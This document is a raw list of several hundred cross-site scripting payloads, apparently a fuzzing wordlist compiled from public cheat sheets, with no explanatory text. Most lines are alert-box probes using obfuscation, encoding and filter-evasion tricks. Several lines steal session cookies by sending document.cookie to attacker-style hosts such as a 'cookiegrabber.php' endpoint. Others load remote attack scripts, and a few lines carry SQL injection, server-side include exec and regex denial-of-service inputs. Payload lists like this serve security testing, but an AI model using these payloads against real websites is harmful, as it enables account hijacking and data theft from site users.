37) <///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
<script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
<script>alert(1337)</script><marquee><h1>XSS by 1</h1></marquee>
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);
<object data=data:text/html;,%3cscript%3ealert(4);%3c/script%3e>
<a href="about:<script>document.write("XSS-XSS-XSS");</script>">
<div style="width: expression(document.write("XSS-XSS-XSS"););">
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
<!-- -- --><script>document.vulnerable=true;</script><!-- -- -->
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
13) <iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">
<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X
<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>
<script src="http://www.evilsite.org/cookiegrabber.php"></script>
<@uni>0[<@/uni>'<@oct>ev<@/oct><@hex>al<@/hex>'<@uni>](e)<@/uni> 
<? echo('<SCR)';echo('IPT>document.vulnerable=true</SCRIPT>'); ?>
<;SCRIPT a=";>;"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
45) "><img src=x onerror=window.open('https://www.google.com/');>
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
<;SCRIPT =";blah"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out
<;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";>;
<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
24) http://www.google<script .com>alert(document.location)</script
16) <input type="text" value=``<div/onmouseover='alert(1)'>X</div>
<style><!--</style><script>document.vulnerable=true;//--></script>
<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
<input type="image" dynsrc="javascript:document.vulnerable=true;">
<EMBED SRC="http://hacker.com/xss.swf" AllowScriptAccess="always">
<OBJECT TYPE="text/x-scriptlet" DATA="http://hacker.com/xss.html">
<object type=text/html data="javascript:alert(([code]);"></object>
with(RegExp)an:alert(true,'ly is possible');too:!!!1,('of course')
{µ=String.fromCharCode;eval('alert('+µ(91)+'1,2,3,4,5'+µ(93)+')')}
\u50001=/atob('YWxlcnQoJ01lcnJ5IENocmlzdG1hcyBoYWNrZXJzIScp')/[-1]
<;SCRIPT a=";>';>"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:alert(1)>XXX</a>
<><this/><is/><valid/><javascript/></>..*.*.*..text(alert('Hehe'));
<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
<style type="text/javascript">document.write("XSS-XSS-XSS");</style>
48) <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
{var {5:y,2:q,1:z,4:u,3:r,0:w}="velart"}[0][z+w+r+q](r+q+z+u+y)(123)
top['eval'] === top['anything',1,0,false,true,null,undefined,'eval']
[[url=http://brainpillow.cc]y3t an0ther unstarted h0me blog..[/url]]
<;SCRIPT ";a=';>;';"; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
17) <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
typeof typeof typeof typeof typeof typeof typeof typeof undefined(1);
<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
<;FRAMESET>;<;FRAME SRC=";javascript:alert(';XSS';);";>;<;/FRAMESET>;
<script xmlns="http://www.w3.org/1999/xhtml" id="x">alert(1)</script>
/iiiiggggmmmm/iiiiiggggmmmm/ /iiiiiggggmmmmmmm/iiiiiggggmmmm/alert(1) 
æ:with(/æ/)õ:'æ';Þ:!0e1,alert(/Ð/);throw'å',(1in Þ),'æ';ã:'å'+(æ=1);-ã
eval(String(/\x61\x6c\x65\x72\x74\x28\x31\x29/.exec(/zzzzalert(1)/)));
location=XML(<x>java{[]}script:ale{[]}rt(/I am a e4x haxor/)</x>).*::*
<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
38) <img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
23) <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<image src="http://somedomain/somegraphic.jpg" onload="alert(/XSS/)" />
try{c=/wtf/[-5]+'rt(/#/[-2])',a}catch(b){b.eval(c.replace(/[fs]/g,''))}
a:;{;1*(1/(this.window.top[(('')+("alert")+(''))])(/1/.source)+1)-1;}; 
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==>
<input type="image" dynsrc="javascript:document.write("XSS-XSS-XSS");">
<FRAMESET><FRAME SRC="javascript:document.vulnerable=true;"></frameset>
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out
<script>alert("XSS by \n1")</script><marquee><h1>XSS by 1</h1></marquee>
<form id="test" /><button form="test" formaction="javascript:alert(1)">X
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<?xml-stylesheet type="text/css"?><root style="x:expression(write(1))"/>
<link rel="stylesheet" href="javascript:document.write("XSS-XSS-XSS");">
\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=
<!--[if gte IE 4]><SCRIPT>document.vulnerable=true;</SCRIPT><![endif]-->
perl -e &#039;print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";&#039; > out
<;SCRIPT a=";blah"; ';'; SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
"><script>alert(1337)</script>"><script>alert("XSS by \n1</h1></marquee>
  <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt='
"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt="
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">
1) <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
16) <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
<;TABLE>;<;TD BACKGROUND=";javascript:alert(';XSS';)";>;<;/TD>;<;/TABLE>;
<div STYLE="background-image: url(javascript:document.vulnerable=true;)">
AK%22%20style%3D%22background:url(javascript:alert(%27XSS%27))%22%20OS%22
top['ev'+'al'](['al','ert','(1)']['toS'+'tring']()['repl'+'ace'](/,/g,''))
<\sc\r\ipt>ale\u0072t('SS\x58'.split('').reverse().join(''))<\/\sc\r\ipt> 
<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>
['red'],alert('sum 1 is');try{1in to}catch(me){alert(!1 & 'the police');} 
<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
</title><meta http-equiv='content-type' content='text/html;charset=utf-7'>
<div style="background-image: url(javascript:document.vulnerable=true;);">
39) &#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
perl -e &#039;print \"<IMG SRC=java\0script:alert(\"XSS\")>\";&#039; > out
"><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
"><script>alert("XSS by \n1")</script>><marquee><h1>XSS by 1</h1></marquee>
<svg onload="javascript:alert(1)" xmlns="http://www.w3.org/2000/svg"></svg>
18) <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
javascript:[$,_]=(function()[_ for each(_ in ["alert",eval])])(),_($)(123);
javascript:{http://%0A(%46un%63\u0074ion%0C(('\u0061le%72t((1))'))%0A())()}
<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>
<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
<object classid="clsid:..." codebase="javascript:document.vulnerable=true;">
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
'"></title><script>alert(1337)</script>><marquee><h1>XSS by 1</h1></marquee>
<script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>;
<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
<object data=data:text/html;charset=utf-8,%3cscript%3ealert(3);%3c/script%3e>
new Function(<text><x y="a"></x><x y="lert"></x><x y="(1)"></x></text>..@y)()
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
<div STYLE="background-image: url(&#1;javascript:document.vulnerable=true;)">
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
[$y=('al')]&&[$z=$y]&&[$z+=('ert')+[]][DocDan=(/ev/)[-1]+$y]($z).valueOf()(1) 
<?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>
for(i=1;i<5;i++){e+=String.fromCharCode((35/3)*P(i,3)-89*P(i,2)+(607/3)*i-24)}
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
45) /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
48) <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+1/+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ ++alert(1)
<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
"><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
27) <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
8) <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
<div style="background-image: url(javascript:document.write("XSS-XSS-XSS"););">
31) <form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
22) <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
<img src=`&#14&#106&#97va&#9&#115&#99ript&#58ale&#114t&#47&#x2a&#102" alt="" /> 
<script>location=<text>javascr{new Array}ipt:aler{new Array}t(1)</text></script>
<meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;">
<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
22) <form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
<!--[if]><script>alert(1)</script --> <!--[if<img src=x onerror=alert(1)//]> -->
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=alert(1)></a>">
<!DOCTYPE> <div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
<img """><script>alert("XSS by \n1")</script><marquee><h1>XSS by 1</h1></marquee>
perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
<;STYLE>;BODY{-moz-binding:url(";http://ha.ckers.org/xssmoz.xml#xss";)}<;/STYLE>;
<a href="data::,&#x25;3Cscr&#37;69pt>%5Cu0061lert(1)</&#X00025;73cript>">XSS</a> 
"><script>eval(location.hash)</script> //where the url hash is: #0={};<<payload>> 
<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS
<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
28) <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
8) <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
<svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(1)"></g></svg>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
40) &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML>
10) <iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
window[Boolean[-6][5]+Boolean[-6][3]+Boolean[-6][4]+String[-6][2]+String[-6][1]](1)
/*@cc_on@set@x=88@set@ss=83@set@s=83@*/@cc_on alert(String.fromCharCode(@x,@s,@ss))
<;EMBED SRC=";http://ha.ckers.org/xss.swf"; AllowScriptAccess=";always";>;<;/EMBED>;
String(/http:/+/www.x.se/+(/x/+[])[1]+(/m/+[])[1]+(/8/+[])[1]+(/#/+[])[1]).slice(1) 
<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
'"></title><script>alert("XSS by \n1")</script>><marquee><h1>XSS by 1</h1></marquee>
<meta http-equiv="refresh" content="0;url=javascript:document.write("XSS-XSS-XSS");">
<img """><script>alert("XSS by \nxss")</script><marquee><h1>XSS by xss</h1></marquee>
<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">
<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
javascript:window[490837..toString(1<<5)](8680439..toString(30))(580049..toString(30))
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
29) </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<head><base href="javascript://"></head><body><a href="/. /,alert(1)//#">XXX</a></body>
x=eval(eval(eval(eval(eval))), alert(/1/</xmp><script>alert(1)</script><!--));x=eval(x)
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
15) <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
25) <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
50) </svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
34) <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";&#10;eval(a+b+c+d);
<;META HTTP-EQUIV=";Link"; Content=";<;http://ha.ckers.org/xss.css>;; REL=stylesheet";>;
<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';XSS';)";)}<;/STYLE>;
<STYLE>li {list-style-image: url("javascript:alert(&#39;XSS&#39;)");}</STYLE><UL><LI>XSS
<div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)> 
'"></title><script>alert("XSS by \nxss")</script>><marquee><h1>XSS by xss</h1></marquee>
mhtml:http://html5sec.org/test.html!xss.html mhtml:http://html5sec.org/test.gif!xss.html
[_=(/al/ig)[-1]+(/ert/mgi)[1-2]][(/ev/img)[-1]+(/al/gimmi)[-Math.cos(0)]](_).valueOf()(1)
(Å=[],[µ=!Å+Å][µ[È=++Å+Å+Å]+({}+Å)[Ç=!!Å+µ,ª=Ç[Å]+Ç[+!Å],Å]+ª])()[µ[Å]+µ[Å+Å]+Ç[È]+ª](Å) 
<script><script><script><script>{alert(/Why? hehe/)}</script></script></script></script> 
<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>
47) </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
25) <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";>;
<meta HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.vulnerable=true</SCRIPT>">
This one shows that FF reads base64 and ignores every character after until the payload:-
<;IMG SRC=";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode";>;
<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
with(URIError[-5-0e0])eval(/./.eval((false.toString()).replace(/[fs]/g,'')+'rt('+1e0+')'))
(É=[Å=[],µ=!Å+Å][µ[È=-~-~++Å]+({}+Å)[Ç=!!Å+µ,ª=Ç[Å]+Ç[+!Å],Å]+ª])()[µ[Å]+µ[Å+Å]+Ç[È]+ª](Å)
<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X
<meta HTTP-EQUIV="Link" Content="<http://www.securitycompass.com/xss.css>; REL=stylesheet">
<iframe src="javascript:alert('XSS by \n1');"></iframe><marquee><h1>XSS by 1</h1></marquee>
<;OBJECT TYPE=";text/x-scriptlet"; DATA=";http://ha.ckers.org/scriptlet.html";>;<;/OBJECT>;
46) //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
window['Event']['constructor']['__proto__']['__proto__']['__parent__']['_content'].alert(1)
14) <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
(É=[Å=É=[]][(µ=!É+É)[È=++Å+Å+Å]+({}+É)[Å]+(ª=(Ç=!!È+É)[Å]+Ç[+É])])()[µ[Å]+µ[Å+Å]+Ç[È]+ª](Å) 
\u0030\u005b\u0022\x65\x76\x61\x6C"\u005d\u0028\u0027\x61\x6C\x65\x72\x74\x28\x31\x29'\u0029
<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(';XSS';);";>;]]>;
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;">
<div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
($=[$=[]][(µ=!$+$)[_=-~-~-~$]+({}+$)[Å=_/_]+(º=(Ç=!''+$)[Å]+Ç[+$])])()[µ[Å]+µ[Å+Å]+Ç[_]+º](Å)
B=/a/[-1]=='a'?'FF':'\v'=='v'?'IE':/a/.__proto__=='//'?'Saf':/s/.test(/a/.toString)?'Chr':'Op'
20) </script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>
<OBJECT TYPE="text/x-scriptlet" DATA="http://www.securitycompass.com/scriptlet.html"></object>
javascript:is="used";for each(member in "slackers")can:(u=confirm(/it/))?['p'*le453]:"thanks";
($=[$=[]][(µ=!$+$)[_=-~-~-~$]+({}+$)[Å=_/_]+(º=(Ç=!''+$)[Å]+Ç[+$])])()[µ[Å]+µ[_+~$]+Ç[_]+º](Å)
with(b={})if((b.c=function(){return'ale'})&&(b.a=function(){return'rt'}))eval(b.c()+b.a())(0);
<div style="x:expression((window.r==1)?'':eval('r=1;alert(String.fromCharCode(88,83,83));'))"> 
<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
($=[$=[]][(µ=!$+$)[_=-~-~-~$]+({}+$)[Å=_/_]+(ª=(Ç=!''+$)[Å]+Ç[+$])])()[µ[Å]+µ[_+~$]+Ç[_]+ª](Å) 
(É=[É=[]][(µ=!É+É)[È=-~-~-~É]+({}+É)[Å=È/È]+(ª=(Ç=!!È+É)[Å]+Ç[+É])])()[µ[Å]+µ[È+~É]+Ç[È]+ª](Å) 
<Q%^&*(£@!'" style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>
a=String(d+(/f/+[])[1]+x+y+(/m/+[])[1]+z+(/h/+[])[1]+(/a/+[])[1]+x+z+y+(/d/+[])[1]+(/e/+[])[1]);
3) <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>
eval(new Array(new Array(new Array(new Array('aler'))))+Array('t')+[]+Array(Array(Array('(1)'))))
<a href=data&#x3atext/html&#59b&#x61se6&#x34&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>test</a>
<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
<;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==">Test</a> 
<div&nbsp &nbsp style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
<style>p[foo=bar{}*{-o-link:'javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<;STYLE>;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}<;/STYLE>;<;UL>;<;LI>;XSS
<;SCRIPT>;document.write(";<;SCRI";);<;/SCRIPT>;PT SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
44) //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
<t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;">
'moving',back,'or',forward,'...just',find(/a way/),'to',stop('the'+focus, 'on',411,this.alert('s'))
5) <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ​
<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
">/XaDoS/><script>alert(document.cookie)</script><script src="http://www.site.com/XSS.js"></script>
6) <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">​
function bs(n) parseInt(n, n = n.split('').sort().pop().charCodeAt() - 86) + "..toString(" + n + ")"
(µ=[µ=[]][(ø=!µ+µ)[ª=-~-~-~µ]+({}+µ)[ª/ª]+(æ=(µª=!!ª+µ)[ª/ª]+µª[+µ])])()[ø[ª/ª]+ø[ª+~µ]+µª[ª]+æ](ª/ª)
32) <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(1)//#x"/>
a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
30) <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
<a href=dat&#x61&#x3atext&#x2fhtml&#x3b&#59base64a&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>Test</a>
+ADw-/title+AD4APA-meta http-equiv+AD0-'content-type' content+AD0-'text/html+ADs-charset+AD0-utf-7'+AD4-
sure:with('morfi')you:'can',prompt('ly');throw 'your',(self in top),'position';of:'any'+(contest=!!!1);-P
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
javascript:(function($)window[$.next()]($.next())(7911..toString(16)))($ for($ in {eval:1,alert:1})if($)) 
<script>location.href="http://www.evilsite.org/cookiegrabber.php?cookie="+escape(document.cookie)</script>
($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
$=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])],$()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)
XXX<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
<? foo="><script>alert(1)</script>"> <! foo="><script>alert(1)</script>"> </ foo="><script>alert(1)</script>">
<a href=dat&#x61&#x3atext&#x2fhtml&#x3b&#59base64ANYTHING&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>Test</a>
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
<script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K";>;
with(document)with(body)appendChild(createElement(Script.name)).src=String(/http:/+/www.x.se/+/xm8#/).slice(1); 
javascript:/**/while /**/(/**/typeof/**/ top/**/[/**/"al"/**/+/**/"ert"/**/]/*[*/(/**/1/**/)/**/)/**/break/**/;// 
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
